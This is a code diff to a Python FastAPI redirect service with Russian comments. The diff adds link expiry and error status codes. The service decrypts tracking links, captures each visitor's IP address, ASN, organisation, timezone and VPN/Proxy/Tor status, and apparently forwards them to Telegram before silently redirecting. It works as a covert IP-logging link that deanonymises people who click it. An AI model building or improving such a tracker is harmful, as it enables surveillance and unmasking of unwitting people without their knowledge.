@@ -1,5 +1,5 @@
 from fastapi import FastAPI, Request
-from fastapi.responses import RedirectResponse
+from fastapi.responses import RedirectResponse, JSONResponse
 from cryptography.fernet import Fernet
 import httpx
 import json
@@ -12,7 +12,6 @@ cipher = Fernet(SECRET_KEY)
 
 IPINFO_TOKEN = ""  # Можно оставить пустым
 
-
 @app.get("/link/{encrypted_url}")
 async def redirect_encrypted(request: Request, encrypted_url: str):
     # Расшифровка ссылки
@@ -21,9 +20,14 @@ async def redirect_encrypted(request: Request, encrypted_url: str):
         data = json.loads(data_json)
         original_url = data["url"]
         user_id = data["user_id"]
+        expires_timestamp = data.get("expires")
     except Exception as e:
         print("Ошибка при расшифровке ссылки:", e)
-        return {"error": "Invalid link"}
+        return JSONResponse({"error": "Invalid link"}, status_code=400)
+
+    # Проверка срока жизни ссылки
+    if expires_timestamp and datetime.utcnow().timestamp() > expires_timestamp:
+        return JSONResponse({"error": "Срок действия ссылки истёк"}, status_code=403)
 
     # Определяем IP
     ip = request.headers.get("x-forwarded-for", request.client.host)
@@ -119,7 +123,6 @@ async def redirect_encrypted(request: Request, encrypted_url: str):
 🌐 Сеть:
 - ASN: {vpn_info.get('asn')}
 - Организация: {vpn_info.get('org')}
-- Тип подключения: {vpn_info.get('connection_type')}
 - Часовой пояс: {vpn_info.get('timezone')}
 
 🔒 VPN/Proxy/Tor:
@@ -142,9 +145,3 @@ async def redirect_encrypted(request: Request, encrypted_url: str):
         print("Ошибка отправки в Telegram:", e)
 
     return RedirectResponse(original_url)
-
-
-if __name__ == "__main__":
-    import uvicorn
-    print("Сервер запущен на порту 8000")
-    uvicorn.run(app, host="0.0.0.0", port=8000)
